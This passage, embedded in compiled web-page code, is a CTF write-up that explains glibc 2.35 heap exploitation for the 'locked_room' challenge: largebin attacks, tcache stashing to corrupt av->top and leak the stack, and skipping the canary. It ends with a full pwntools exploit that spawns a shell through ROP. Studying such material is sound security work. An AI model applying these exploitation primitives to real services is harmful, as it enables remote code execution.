leak."}),"\n"]}),"\n",(0,a.jsxs)(n.p,{children:["This isn't much of a viable option. While we could overwrite the size of the top chunk to increase the ",(0,a.jsx)(n.code,{children:"max_address"}),", this wouldn't be very helpful as the ends of our chunks, and thus the chunks themselves, can't be after the top chunk. And even though our ",(0,a.jsx)(n.code,{children:"system_mem"})," is large now, we can't do a house of force since our allocation sizes are capped at ",(0,a.jsx)(n.code,{children:"0x800"}),". So we'd need to overwrite ",(0,a.jsx)(n.code,{children:"av->top"})," to a greater address."]}),"\n",(0,a.jsxs)(n.p,{children:["The largebin attack can only write heap addresses (and ones lower than ",(0,a.jsx)(n.code,{children:"av->top"})," for that matter). While we could misalign the largebin attack , such as writing it to ",(0,a.jsx)(n.code,{children:"&av->top + 1"})," to make it much larger, we still need ",(0,a.jsx)(n.code,{children:"av->top"})," to be a valid address, as it needs to be able to access ",(0,a.jsx)(n.code,{children:"chunksize(av->top)"}),"."]}),"\n",(0,a.jsx)(n.p,{children:"So ideally we'd want to be able to write a libc or stack address, depending on the route for RCE you take, but how can we do that?"}),"\n",(0,a.jsxs)(n.p,{children:["One way could be allocating somewhere before ",(0,a.jsx)(n.code,{children:"&av->top"})," and overwriting ",(0,a.jsx)(n.code,{children:"av->top"}),", but that just shifts the problem to:"]}),"\n",(0,a.jsxs)(n.ol,{children:["\n",(0,a.jsxs)(n.li,{children:["How to increase ",(0,a.jsx)(n.code,{children:"av->top"})," enough to come after ",(0,a.jsx)(n.code,{children:"&av->top"}),"."]}),"\n",(0,a.jsxs)(n.li,{children:["How to write a fake size field before ",(0,a.jsx)(n.code,{children:"&av->top"})," (for a tcache/fastbin allocation)."]}),"\n"]}),"\n",(0,a.jsxs)(n.p,{children:["An attack that ",(0,a.jsx)(n.em,{children:"would"})," have worked well for the 1st problem was the ",(0,a.jsx)(n.a,{href:"https://github.com/shellphish/how2heap/blob/master/glibc_2.23/unsorted_bin_attack.c",children:"unsorted bin attack"}),", which was like the largebin attack, except it could write a ",(0,a.jsx)(n.em,{children:"libc"})," address instead. And not just any libc address, but it came from ",(0,a.jsx)(n.code,{children:"&av->bins"}),", which comes ",(0,a.jsx)(n.em,{children:"after"})," ",(0,a.jsx)(n.code,{children:"&av->top"}),"."]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-c",children:"struct malloc_state\n{\n// ...\n  mfastbinptr fastbinsY[NFASTBINS];\n  mchunkptr top;\n  mchunkptr last_remainder;\n  mchunkptr bins[NBINS * 2 - 2];\n// ...\n};\n"})}),"\n",(0,a.jsxs)(n.p,{children:["Shame too, because there's actually a relatively simple solution to the 2nd problem. As you can see above in ",(0,a.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L1830",children:"struct malloc_state"}),", the fastbin array is right before ",(0,a.jsx)(n.code,{children:"->top"}),", and since we easily corrupt fastbin (using our tcache writes), we could bring any pointer to the head of a fastbin, but that could also be any value, such as a fake size field for a fake tcache chunk. Of course we couldn't allocate from this fastbin, and largebin allocations would fail because ",(0,a.jsx)(n.code,{children:"malloc_consolidate()"})," would attempt to dereference this, but who actually cares?"]}),"\n",(0,a.jsx)(n.h3,{id:"tcache-stashing-on-av-top",children:"Tcache stashing on av->top"}),"\n",(0,a.jsx)(n.p,{children:"Thankfully there is another attack which solves the 1st problem, this time involving smallbins and tcache, which can be used similarly to a largebin attack, but this allows us to write a libc address instead. But how?"}),"\n",(0,a.jsxs)(n.p,{children:["The mechanism responsible for this involves moving smallbin chunks to tcache (i.e. stashing them in tcache). This is triggered in ",(0,a.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L3770",children:"_int_malloc"}),", specifically the initial case when it's allocating from a smallbin:"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-c",metastring:'title="https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L3901"',children:'if (in_smallbin_range (nb))\n  {\n    idx = smallbin_index (nb);\n    bin = bin_at (av, idx);\n\n    if ((victim = last (bin)) != bin)\n      {\n        bck = victim->bk;\n        if (__glibc_unlikely (bck->fd != victim))\n          malloc_printerr ("malloc(): smallbin double linked list corrupted");\n        set_inuse_bit_at_offset (victim, nb);\n        bin->bk = bck;\n        bck->fd = bin;\n'})}),"\n",(0,a.jsxs)(n.p,{children:["If the smallbin (for the size ",(0,a.jsx)(n.code,{children:"nb"}),") is non-empty, it unlinks the last chunk (",(0,a.jsx)(n.code,{children:"bin->bk"}),") and returns it. But before returning, it will then check if there are other smallbin chunks that could be linked into the tcachebin of that same size."]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-c",metastring:'title="https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L3919"',children:"/* While we're here, if we see other chunks of the same size,\n    stash them in the tcache.  */\nsize_t tc_idx = csize2tidx (nb);\nif (tcache && tc_idx < mp_.tcache_bins)\n  {\n    mchunkptr tc_victim;\n\n    /* While bin not empty and tcache not full, copy chunks over.  */\n    while (tcache->counts[tc_idx] < mp_.tcache_count\n           && (tc_victim = last (bin)) != bin)\n      {\n        if (tc_victim != 0)\n          {\n            bck = tc_victim->bk;\n            set_inuse_bit_at_offset (tc_victim, nb);\n            if (av != &main_arena)\n            set_non_main_arena (tc_victim);\n            bin->bk = bck;\n            bck->fd = bin;\n\n            tcache_put (tc_victim, tc_idx);\n          }\n      }\n  }\n"})}),"\n",(0,a.jsx)(n.p,{children:"Now it iterates through the smallbin until either it's empty, or the tcache is full (this part is important), unlinking smallbin chunks the same way it was before, then adding the chunks to the tcache."}),"\n",(0,a.jsxs)(n.p,{children:["Interestingly, the check ",(0,a.jsx)(n.code,{children:"bck->fd != victim"})," is absent in the loop, so nothing really stops us overwriting a ",(0,a.jsx)(n.code,{children:"->bk"})," field in one of these ",(0,a.jsx)(n.code,{children:"tc_victim"})," chunks, to control ",(0,a.jsx)(n.code,{children:"bck"}),". If we did that, then it would reach the line ",(0,a.jsx)(n.code,{children:"bck->fd = bin"}),", and would write the address of the smallbin (which is located in ",(0,a.jsx)(n.code,{children:"main_arena"}),") to ",(0,a.jsx)(n.code,{children:"bck+0x10"}),"!"]}),"\n",(0,a.jsx)(n.p,{children:"One issue to deal with is what happens after this?"}),"\n",(0,a.jsxs)(n.p,{children:["Since ",(0,a.jsx)(n.code,{children:"bin->bk = bck;"})," is also triggered, we have ",(0,a.jsx)(n.code,{children:"last(bin) = bck"}),", so we go to that chunk next in the loop, where we may face problems (depending on what our ",(0,a.jsx)(n.code,{children:"bck"})," was)."]}),"\n",(0,a.jsxs)(n.p,{children:["This is where that tcache being full check comes into play. While it will believe there's more from the smallbin, if the ",(0,a.jsx)(n.code,{children:"tc_victim"})," (with the malicious ",(0,a.jsx)(n.code,{children:"bck"}),") was the 7th chunk for that tcache bin (i.e. tcache is now full), then it will terminate, and not do anything more with the ",(0,a.jsx)(n.code,{children:"bck"}),"."]}),"\n",(0,a.jsxs)(n.p,{children:["We can use this to overwrite ",(0,a.jsx)(n.code,{children:"target=&av->top"})," with a libc address as follows:"]}),"\n",(0,a.jsxs)(n.ol,{children:["\n",(0,a.jsx)(n.li,{children:"Allocate 8 smallbin-sized chunks (again, separated from each other and the top chunk)"}),"\n",(0,a.jsx)(n.li,{children:"Fill tcache of the same size."}),"\n",(0,a.jsx)(n.li,{children:"Free those 8 chunks (to unsortedbin)."}),"\n",(0,a.jsx)(n.li,{children:"Allocate a bigger chunk to send them all to smallbin."}),"\n",(0,a.jsxs)(n.li,{children:["Overwrite the ",(0,a.jsx)(n.code,{children:"->bk"})," field of the last freed smallbin chunk to ",(0,a.jsx)(n.code,{children:"target-0x10"}),". This will be the last chunk used in the loop (i.e. ",(0,a.jsx)(n.code,{children:"bin->fd"}),")."]}),"\n",(0,a.jsx)(n.li,{children:"Allocate a chunk of the same smallbin size."}),"\n"]}),"\n",(0,a.jsxs)(n.p,{children:["The last allocated chunk will be serviced by the first freed smallbin chunk (",(0,a.jsx)(n.code,{children:"bin->bk"}),"), and then the remaining 7 smallbin chunks are sent to tcache, while also writing to ",(0,a.jsx)(n.code,{children:"av->top"}),"!"]}),"\n",(0,a.jsx)(n.admonition,{type:"info",children:(0,a.jsxs)(n.p,{children:["By the time of ",(0,a.jsx)(n.code,{children:"av->top"})," pointing to libc, we need ",(0,a.jsx)(n.code,{children:"av->system_mem"})," to be large so that ",(0,a.jsx)(n.code,{children:"min_address"})," is below the heap, thus we can still allocate within the heap region (",(0,a.jsx)(n.code,{children:"0x7f... - 0x55... \u2248 0x2a..."}),")."]})}),"\n",(0,a.jsx)(n.admonition,{type:"info",children:(0,a.jsx)(n.p,{children:"This will (of course) corrupt the smallbin used, so ideally we'd want to avoid using this smallbin for allocations, which can be done using larger chunks, or tcache."})}),"\n",(0,a.jsx)(n.h3,{id:"fixing-av-top",children:"Fixing av->top"}),"\n",(0,a.jsxs)(n.p,{children:["This will have a small (or rather, large) issue. See, when ",(0,a.jsx)(n.code,{children:"av->top"})," points into ",(0,a.jsx)(n.code,{children:"av->bins"}),", while we have solved the problem of our allocations coming before ",(0,a.jsx)(n.code,{children:"av->top"}),", we run into another issue: the top chunk size."]}),"\n",(0,a.jsxs)("figure",{children:[(0,a.jsx)("img",{src:"/assets/image (209).png",alt:""}),(0,a.jsx)("figcaption",{children:(0,a.jsx)("p",{children:(0,a.jsx)("code",{children:"main_arena.bins"})})})]}),"\n",(0,a.jsxs)(n.p,{children:["The ",(0,a.jsx)(n.code,{children:".bins"})," array is initially set up so that for every bin index ",(0,a.jsx)(n.code,{children:"i"}),":"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-c",children:"bin = av->bins[i]\nassert (bin->fd == bin->bk == bin)\n"})}),"\n",(0,a.jsxs)(n.p,{children:["The way this is done is by have the ",(0,a.jsx)(n.code,{children:"fd"})," and ",(0,a.jsx)(n.code,{children:"bk"})," pointers point ",(0,a.jsx)(n.code,{children:"-0x10"})," back, so the ",(0,a.jsx)(n.code,{children:"bin->prev_size"})," and ",(0,a.jsx)(n.code,{children:"bin->size"})," overlap with the previous bin's ",(0,a.jsx)(n.code,{children:"fd"})," and ",(0,a.jsx)(n.code,{children:"bk"})," pointers."]}),"\n",(0,a.jsxs)(n.p,{children:["This means that ",(0,a.jsx)(n.code,{children:"chunksize(av->top)"})," will be the previous smallbin's ",(0,a.jsx)(n.code,{children:"bk"})," pointer, by default a libc address, and because ",(0,a.jsx)(n.code,{children:"av->system_mem"})," is a heap address, ",(0,a.jsx)(n.code,{children:"min_address"})," will be too large for the ",(0,a.jsx)(n.code,{children:"main_arena"})," allocation (",(0,a.jsx)(n.code,{children:"0x7f... + 0x7f... - 0x55... \u2248 0xa9..."}),")."]}),"\n",(0,a.jsxs)(n.p,{children:["While we could lower that ",(0,a.jsx)(n.code,{children:"bk"})," pointer to a heap address by having chunks freed to that smallbin, so that the ",(0,a.jsx)(n.code,{children:"main_arena"})," allocation could still work, we need to keep in mind how the tcache stashing write works. When we trigger the actual write, we allocate a smallbin chunk back ",(0,a.jsx)(n.em,{children:"on the heap"}),", so when ",(0,a.jsx)(n.code,{children:"av->top"})," is overwritten, it will then check if that heap chunk is valid, which it won't be due to the top chunk size."]}),"\n",(0,a.jsxs)(n.p,{children:["So we need to lower that ",(0,a.jsx)(n.em,{children:"even further"}),". For this, we can use another largebin attack! While it does only write a heap address, we can actually misalign this write by ",(0,a.jsx)(n.code,{children:"-2"})," so that the top 2 null bytes of the address overwrite the greatest 2 bytes of the ",(0,a.jsx)(n.code,{children:"bk"})," pointer. This will shrink it to a 32 bit integer (from 48 bits), which is plenty small enough for that ",(0,a.jsx)(n.code,{children:"min_address"})," calculation to be below the heap region."]}),"\n",(0,a.jsxs)(n.p,{children:["This will need to be done ",(0,a.jsx)(n.em,{children:"before"})," the tcache stashing attack, and will completely corrupt the previous smallbin, but again, who actually cares."]}),"\n",(0,a.jsx)(n.h3,{id:"leaking-stack",children:"Leaking stack"}),"\n",(0,a.jsxs)(n.p,{children:["Now that we can, in theory, setup the conditions for an allocation onto ",(0,a.jsx)(n.code,{children:"main_arena"})," and overwrite ",(0,a.jsx)(n.code,{children:"av->top"}),", we need to decide what we want to target."]}),"\n",(0,a.jsxs)(n.p,{children:['The avenue I went down was the classic "overwrite the return address", but for that we\'re gonna need a stack leak. But how? Even if we could allocate on/near something like ',(0,a.jsx)(n.code,{children:"environ"})," or ",(0,a.jsx)(n.code,{children:"__libc_argv"}),", the ",(0,a.jsx)(n.code,{children:"view"})," would only allow us to read the data we send (due to how ",(0,a.jsx)(n.code,{children:".len"})," is set), so the only way of reading the data at these variables is to overwrite them."]}),"\n",(0,a.jsx)(n.p,{children:"So it seems the only way to get a data leak is to bring it to you (i.e. into your chunk), rather than bringing our chunks to the data, which is similar to what we did when leaking libc and heap. Thankfully, we can use our good ol' friend tcache stashing to do this."}),"\n",(0,a.jsxs)(n.p,{children:["I originally found out about this technique (and tcache stashing in general) from ",(0,a.jsx)(n.a,{href:"https://enzo.run/posts/lactf2025/#solution-1",children:"this writeup from LA CTF"}),"."]}),"\n",(0,a.jsxs)(n.p,{children:['The idea is we can "link" a stack address into a smallbin by pointing a ',(0,a.jsx)(n.code,{children:"bk"})," pointer to it, then when the tcache stashing occurs, the stack address is the last ",(0,a.jsx)(n.code,{children:"tc_victim"}),", and will be put into the head of the tcachebin (i.e. into ",(0,a.jsx)(n.code,{children:"tcache_perthread_struct"}),"), and since we control the allocation over ",(0,a.jsx)(n.code,{children:"tcache_perthread_struct"}),", we can then view it to leak the stack."]}),"\n",(0,a.jsxs)(n.p,{children:["So the key difference between the setup here and before, is we use 2 less smallbin chunks (8 -> 6), and we point ",(0,a.jsx)(n.code,{children:"bk"})," to ",(0,a.jsx)(n.code,{children:"target-0x18"}),", where ",(0,a.jsx)(n.code,{children:"target"})," contains a stack address. This results in ",(0,a.jsx)(n.code,{children:"target-0x18"})," being the 6th chunk linked into tcache, then finally its ",(0,a.jsx)(n.code,{children:"bk"})," pointer (our stack address) is the 7th and final ",(0,a.jsx)(n.code,{children:"tc_victim"}),". And of course, since the tcache is full after linking the stack address into tcache, it terminates the loop."]}),"\n",(0,a.jsxs)("figure",{children:[(0,a.jsxs)("picture",{children:[(0,a.jsx)("source",{srcset:"/assets/locked_room_tcache_stashing_dark (1).gif",media:"(prefers-color-scheme: dark)"}),(0,a.jsx)("img",{src:"/assets/locked_room_tcache_stashing_light.gif",alt:""})]}),(0,a.jsx)("figcaption",{children:(0,a.jsx)("p",{children:"Demo of tcache stashing for stack leak"})})]}),"\n",(0,a.jsx)(n.h3,{id:"skipping-past-canaries",children:"Skipping past canaries"}),"\n",(0,a.jsxs)(n.p,{children:["Allocating on the stack will be made more difficult by the existence of canaries, as we don't have a good way of leaking them. Like I mentioned earlier, the ",(0,a.jsx)(n.code,{children:"view"})," function makes leaking data with allocations difficult, and we can't use the tcache stashing trick to leak them as they need to be a writable address."]}),"\n",(0,a.jsx)(n.p,{children:"Canaries do get replaced all the time, so maybe you could overwrite a canary with an allocation, then later it comes back, but then it would detect stack smashing."}),"\n",(0,a.jsxs)(n.p,{children:[(0,a.jsx)(n.code,{children:"main"})," has a canary that doesn't get used, but also wouldn't be replaced, so no leak there. And since it doesn't return, the main target is ",(0,a.jsx)(n.code,{children:"alloc_chunk"}),". So if we can't leak it, can we skip it?"]}),"\n",(0,a.jsxs)("figure",{children:[(0,a.jsx)("img",{src:"/assets/image (212).png",alt:""}),(0,a.jsx)("figcaption",{children:(0,a.jsxs)("p",{children:[(0,a.jsx)("code",{children:"alloc_chunk"})," stack (before ",(0,a.jsx)("code",{children:"read"}),")"]})})]}),"\n",(0,a.jsxs)(n.p,{children:["Well we don't have any candidates for a tcache/fastbin allocation, but interestingly we don't actually need those: we can use ",(0,a.jsx)(n.code,{children:"av->top"}),"."]}),"\n",(0,a.jsxs)(n.p,{children:[(0,a.jsx)(n.code,{children:"av->top"})," doesn't have alignment restrictions like tcache/fastbins, and as long as ",(0,a.jsx)(n.code,{children:"chunksize(av->top) <= av->system_mem"})," (",(0,a.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L4372",children:"house of force mitigation"}),") then the top chunk size is considered valid. So we could actually just use the PIE address after the canary as a top chunk size, as ",(0,a.jsx)(n.code,{children:"av->system_mem"})," is a heap address, and thus will always be bigger (you could also misalign the size to make it smaller, as it's followed by a ",(0,a.jsx)(n.code,{children:"0"}),")."]}),"\n",(0,a.jsx)(n.h3,{id:"largebin-cleanup",children:"Largebin cleanup"}),"\n",(0,a.jsxs)(n.p,{children:["Once we have ",(0,a.jsx)(n.code,{children:"av->top"})," pointing into ",(0,a.jsx)(n.code,{children:"main_arena"}),", before we fully control ",(0,a.jsx)(n.code,{children:"av->top"})," using the tcache allocation, a useful preparation step is alloating from ",(0,a.jsx)(n.code,{children:"av->top"})," to overwrite the ",(0,a.jsx)(n.code,{children:"bins"})," array to clean up the largebins. Largebins being corrupted from the largebin attacks does cause us problems when allocating from the top chunk."]}),"\n",(0,a.jsx)(n.p,{children:"Firstly, if our allocations our smaller than the largebin chunks, they will be serviced using those (through remaindering), and not the top chunk. And we can't just empty largebins, as they're corrupted. So if we use chunks larger than the largebins, we bypass this, so we're fine, right?"}),"\n",(0,a.jsxs)(n.p,{children:["Not quite, because once we setup the tcache write into ",(0,a.jsx)(n.code,{children:"main_arena"}),", the fastbin array is corrupted, and thus any large allocations will fail due to ",(0,a.jsx)(n.code,{children:"malloc_consolidate"}),", so we wouldn't be able to allocate larger than largebins to bypass them."]}),"\n",(0,a.jsxs)(n.p,{children:["This is a simple fix, it just requires fixing the pointers in ",(0,a.jsx)(n.code,{children:"av->bins"}),":"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-python",children:'main_arena = b""\nfor i in range(0, 0x440, 0x10):\n    main_arena += p64(libc.sym.main_arena + 256+i)*2\nmalloc(0x800, main_arena)\n'})}),"\n",(0,a.jsx)(n.h3,{id:"putting-it-all-together",children:"Putting it all together"}),"\n",(0,a.jsx)(n.p,{children:"Now we (finally) have all the components for an exploit, so let's put it together:"}),"\n",(0,a.jsxs)(n.ol,{children:["\n",(0,a.jsx)(n.li,{children:"Use double free to overlap chunks with a freed chunks, for heap and libc leaks."}),"\n",(0,a.jsxs)(n.li,{children:["Get double free on fastbins by clearing ",(0,a.jsx)(n.code,{children:"PREV_FAST_FREED"})," using top chunk allocation to poison fastbin."]}),"\n",(0,a.jsxs)(n.li,{children:["Use this fastbin to poison ",(0,a.jsx)(n.code,{children:"tcache[0x290]"})," to allocate onto ",(0,a.jsx)(n.code,{children:"tcache_perthread_struct"})," for infinite writes."]}),"\n",(0,a.jsxs)(n.li,{children:["Allocate chunks necessary for:","\n",(0,a.jsxs)(n.ol,{children:["\n",(0,a.jsxs)(n.li,{children:["Putting fake tcache size into the fastbin array, specifically ",(0,a.jsx)(n.code,{children:"fastbin[0x70]"})," (size chosen for alignment reasons)."]}),"\n",(0,a.jsx)(n.li,{children:"The 2 largebin attacks."}),"\n",(0,a.jsx)(n.li,{children:"The 2 tcache stashing attacks."}),"\n"]}),"\n"]}),"\n",(0,a.jsxs)(n.li,{children:["Perform largebin attack against ",(0,a.jsx)(n.code,{children:"main_arena->system_mem"})," first to decrease ",(0,a.jsx)(n.code,{children:"min_address"})," enough to be able to still do heap allocations once ",(0,a.jsx)(n.code,{children:"av->top"})," has been controlled."]}),"\n",(0,a.jsxs)(n.li,{children:["Perform largebin attack against ",(0,a.jsx)(n.code,{children:"main_arena+262"})," (using larger sizes than for the previous one to avoid reallocation), which is a misaligned write on ",(0,a.jsx)(n.code,{children:"smallbin[0xa0]"})," to setup top chunk size for later."]}),"\n",(0,a.jsxs)(n.li,{children:["Do tcache stashing to leak ",(0,a.jsx)(n.code,{children:"__libc_argv"})," for a stack leak."]}),"\n",(0,a.jsxs)(n.li,{children:["Do tcache stashing against ",(0,a.jsx)(n.code,{children:"main_arena->top"})," using ",(0,a.jsx)(n.code,{children:"smallbin[0xb0]"}),", which writes the address of ",(0,a.jsx)(n.code,{children:"&smallbin[0xa0]"})," to ",(0,a.jsx)(n.code,{children:"main_arena->top"})," (which has the fake top chunk size)."]}),"\n",(0,a.jsxs)(n.li,{children:["Do an allocation larger than (corrupted) largebins to allocate from the new ",(0,a.jsx)(n.code,{children:"av->top"})," to clean up the largebins."]}),"\n",(0,a.jsxs)(n.li,{children:["Put fake tcache size into the fastbin array (this must be done after all the largebin allocations to avoid ",(0,a.jsx)(n.code,{children:"malloc_consolidate"}),")"]}),"\n",(0,a.jsxs)(n.li,{children:["Allocate on ",(0,a.jsx)(n.code,{children:"main_arena"})," using tcache to overwrite ",(0,a.jsx)(n.code,{children:"main_arena->top"})," to point to our target on the stack."]}),"\n",(0,a.jsx)(n.li,{children:"Use smallbin-sized allocation to allocate on the stack using top chunk, overwrite the return address to get ROP!"}),"\n"]}),"\n",(0,a.jsx)(n.h2,{id:"exploit",children:"Exploit"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-python",children:'#!/usr/bin/python3\nfrom pwn import *\n\ne = context.binary = ELF(\'./locked_room_patched\')\nlibc = ELF(\'./libc.so\', checksec=False)\nld = ELF(\'./ld-linux-x86-64.so.2\', checksec=False)\nif args.REMOTE:\n    ip, port = "dicec.tf", 32019\n    conn = lambda: remote(ip, port)\nelse:\n    conn = lambda: e.process()\n\nsend_choice = lambda c: p.sendlineafter(b"> ", str(c).encode())\nprotect = lambda p, addr: p ^ (addr >> 12)\n\ncurrent_index = 0\ndef malloc(size, data=None):\n    if data is None:\n        data = b"X"\n    global current_index\n    send_choice(1)\n    p.sendlineafter(b"Size?\\n> ", str(size).encode())\n    p.sendafter(b"Data?\\n> ", data)\n    current_index += 1\n    return current_index-1\n\ndef free(i):\n    send_choice(2)\n    p.sendlineafter(b"Index?\\n> ", str(i).encode())\n\ndef view(i):\n    send_choice(3)\n    p.sendlineafter(b"Index?\\n> ", str(i).encode())\n    return p.recvuntil(b"1. Alloc\\n", drop=True)\n\np = conn()\n\n### 1. leaking libc and heap\n\n# libc leak\nuaf = malloc(0x800)\nfree(uaf)\n\ni = malloc(0x800, b"A"*8)\nmalloc(8)\n\nfree(uaf)\nlibc_leak = u64(view(i))\nlog.info(f"libc leak: {hex(libc_leak)}")\n\nlibc.address = libc_leak - (libc.sym.main_arena+96)\nlog.info(f"libc: {hex(libc.address)}")\n\n# heap leak\ni = malloc(0x18, b"A"*8)\nfree(uaf)\nheap_leak = u64(view(i))\nlog.info(f"heap leak: {hex(heap_leak)}")\n\nheap = heap_leak << 12\nlog.info(f"heap: {hex(heap)}")\n\n# cleanup\nmalloc(0x18)\nmalloc(0x7e8)\n\nclass TcachePerthreadStruct:\n    def __init__(self):\n        self.counts = [0]*64\n        self.pointers = [0]*64\n    def set_count(self, size, count):\n        idx = (size - 0x20) // 16\n        self.counts[idx] = count\n    def set_pointer(self, size, pointer):\n        idx = (size - 0x20) // 16\n        self.pointers[idx] = pointer\n    def set(self, size, pointer, count=1):\n        self.set_pointer(size, pointer)\n        self.set_count(size, count)\n    def __bytes__(self):\n        output = b""\n        for count in self.counts:\n            output += p16(count)\n        for pointer in self.pointers:\n            output += p64(pointer)\n        return output\n\n### 2. double free fastbin[0x20]\n\ntcache1 = malloc(0x288, flat({0x278: 0x21}))\ntcache2 = malloc(0x288)\n\ntcache = [malloc(0x18) for _ in range(7)]\nfast1 = malloc(0x18)\nfast2 = malloc(0x18)\n\nfor i in tcache:\n    free(i)\n\n# free fastbin chunk next to top chunk\n# so that av->top has PREV_FAST_FREED\nfree(fast2)\n\n# allocate from top chunk to clear PREV_FAST_FREED\nmalloc(0x28)\n\n# double free fast2\nfree(fast1)\nfree(fast2)\n\n### 3. poison tcache[0x290] -> tcache_perthread_struct\n\nfor _ in range(7):\n    malloc(0x18)\n\n# corrupt fastbin[0x20]\nmalloc(0x18, p64(protect(heap + 0xd50, heap+0x1000)))\n\nmalloc(0x18)\nmalloc(0x18)\n\nfree(tcache1)\nfree(tcache2)\n\nmalloc(0x18, flat({0x08: 0x291, 0x10: protect(heap+0x10, heap+0xd50)}))\n\ncurr_heap = heap+0x1130\nlarge1 = curr_heap+0xdd0\nlarge2 = large1+0xf10\n\ntcache = TcachePerthreadStruct()\ntcache.set(0x100, large1)\ntcache.set(0x110, large2)\ntcache.set(0x290, heap+0x10)\nmalloc(0x288)\nmalloc(0x288, bytes(tcache))\n\n\n### 4. setup future attacks\n\n# 4a. setup fastbin fake size\nchunk70 = []\nfor i in range(15):\n    data = flat({0x58: 0x31}) if i == 6 else b"\\x00"\n    chunk70.append(malloc(0x68, data))\n\n\n# 4b. setup largebin attack on av->system_mem\np2 = malloc(0x718)\nmalloc(0x18, flat(0, 0x101))\n\np1 = malloc(0x728)\nmalloc(0x18)\n\n\n# setup largebin attack on main_arena+262 (smallbin[0xa0])\nq2 = malloc(0x798)\nmalloc(0x18, flat(0, 0x111))\n\nq1 = malloc(0x7a8)\nmalloc(0x18, flat(0, 0x51))    # fake size for corrupting next chunk\n\n# 4c. setup 2 tcache staching attacks\nsmall_av_top = []\nsmall_leak_stack = []\n\nsmall_av_top.append(malloc(0xa0, flat({0x98: 0x41})))\nsmall_leak_stack.append(malloc(0x80))\n\nfor i in range(5):\n    small_av_top.append(malloc(0xa0))\n    small_leak_stack.append(malloc(0x80))\nsmall_av_top.append(malloc(0xa0))\nmalloc(0x18)\nsmall_av_top.append(malloc(0xa0))\nmalloc(0x18)    # pad\n\n### 5. do largebin attack on av->system_mem\n\n# this writes a heap address (address of corrupted largebin) to av->system_mem\nfree(p1)\nmalloc(0x738)\n\nfree(p2)\n\ntarget = libc.sym.main_arena+2184\nmalloc(0xf8, p64(0) + p64(0x731) + p64(large1)*3 + p64(target-0x20))\nmalloc(0x738)\n\n\n### 6. do largebin attack on main_arena (smallbin[0xa0])\n\n# this is a misaligned write onto &smallbin[0xa0].bk - 2\n# the upper 2 null bytes will overwrite the MSB of smallbin[0xa0].bk\n# shrinking it enough to be a valid top chunk size later on\nfree(q1)\nmalloc(0x7b8)\n\nfree(q2)\n\ntarget = libc.sym.main_arena+262\nmalloc(0x108, p64(0) + p64(0x7b1) + p64(large2)*3 + p64(target-0x20))\nmalloc(0x7b8)\n\n\ntcache = TcachePerthreadStruct()\ntcache.set(0x40, curr_heap+0x2560)\ntcache.set_count(0x90, 7)      # fill tcache[0x90]\ntcache.set(0x290, heap+0x10)\nmalloc(0x288, bytes(tcache))\n\n### 7. tcache stashing to leak stack\n\n# free to unsortedbin -> smallbin[0x90]\nfor i in reversed(range(len(small_leak_stack))):\n    free(small_leak_stack[i])\nmalloc(0xc0)\n\nmalloc(0x38, flat(0, 0x91, curr_heap+0x26a0, libc.sym.__libc_argv - 0x18))\n\ntcache = TcachePerthreadStruct()\ntcache.set(0x50, curr_heap+0x24b0)\ntcache.set_count(0xb0, 7)       # fill tcache[0xb0]\ntcache.set(0x290, heap+0x10)\nt = malloc(0x288, bytes(tcache))\n\nmalloc(0x80)\n\nstack_leak = u64(view(t)[0xb8:0xc0])\nlog.info(f"stack_leak: {hex(stack_leak)}")\n\n### 8. tcache stashing on av->top\n\n# this writes a libc address (main_arena+256) to av->top\n# this points to smallbin[0xa0], so smallbin[0xa0].bk (that we overwrote earlier)\n# now acts as the top chunk\'s size\n\n# free to unsortedbin -> smallbin[0xb0]\nfor i in reversed(range(len(small_av_top))):\n    free(small_av_top[i])\nmalloc(0xc0)\n\ntarget = libc.sym.main_arena+96     # main_arena->top\nmalloc(0x48, flat(0, 0xb1, curr_heap+0x2730, target - 0x10))\n\n# empty tcache[0xb0]\ntcache = TcachePerthreadStruct()\ntcache.set(0x30, curr_heap+0x310)\ntcache.set(0x290, heap+0x10)\nt = malloc(0x288, bytes(tcache))\n\nmalloc(0xa0)\n\n### 9. allocate using new av->top to fix the largebins\n\nmain_arena = b""\nfor i in range(0, 0x440, 0x10):\n    main_arena += p64(libc.sym.main_arena + 256+i)*2\ni = malloc(0x800, main_arena)\n\n# check that the full overwrite has been done\n# (when running this remotely, I initially had issues with this)\nassert len(view(i)) == len(main_arena)\n\n### 10. use fastbin[0x70] to store a fake size for tcache\n\n# (this needs to be done late on to prevent largebin complications)\nfor i in chunk70:\n    free(i)\nmalloc(0x28, flat(0, 0x71, protect(0x31, heap+0x1000)))\n\n# empty tcache[0x70]\ntcache = TcachePerthreadStruct()\ntcache.set(0x30, libc.sym.main_arena+64)\nt = malloc(0x288, bytes(tcache))\n\n# write fake size to fastbin array\nmalloc(0x68)\n\n### 11. allocate using fake size to overwrite av->top to the stack\n\n# we use a PIE address located after the canary in alloc_chunk()\n# this is a valid top chunk size as main_arena->system_mem is a heap address\n# and thus is larger\ntarget = stack_leak-0x180\nmalloc(0x28, p64(0)*4 + p64(target))\n\n### 12. allocate on stack to get ROP\n\nrop = ROP(libc)\nrop.raw(0)  # rbp\nrop.execve(next(libc.search(b"/bin/sh\\x00")), 0, 0)\n\n# use a smallbin sized chunk to prevent triggering a malloc_consolidate()\n# as we have invalid chunks in the fastbin array\nmalloc(0x300, b"A"*8 + rop.chain())\n\nprint(current_index)\np.interactive()\n'})}),"\n",(0,a.jsxs)("figure",{children:[(0,a.jsx)("img",{src:"/assets/image (29).png",alt:""}),(0,a.jsx)("figcaption",{children:(0,a.jsx)("p",{children:"Getting the flag"})})]}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.code,{children:"dice{without_love..._'the_flag'_cannot_be_seen...!}"})})]})}function 